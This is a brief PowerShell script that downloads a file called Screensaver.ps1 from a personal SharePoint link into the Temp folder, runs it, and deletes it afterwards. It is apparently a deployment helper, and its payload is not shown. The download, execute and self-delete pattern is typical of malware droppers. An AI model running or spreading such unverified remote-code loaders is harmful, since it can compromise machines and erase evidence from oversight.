$url = "https://acceleronsolutions-my.sharepoint.com/:u:/g/personal/bishnu_panigrahi_acceleronsolutions_io/EbmXIBAvrzJFtgb31Bb_2ZgBrYhCj0R_DugZTONNW5YtVg?download=1"
$output = "$env:Temp\Screensaver.ps1"

# Remove if it already exists
if (Test-Path $output) {
    Remove-Item $output -Force
}

# Download the script
Invoke-WebRequest -Uri $url -OutFile $output

# Execute the script
& $output

# Delete after execution
Remove-Item $output -Force
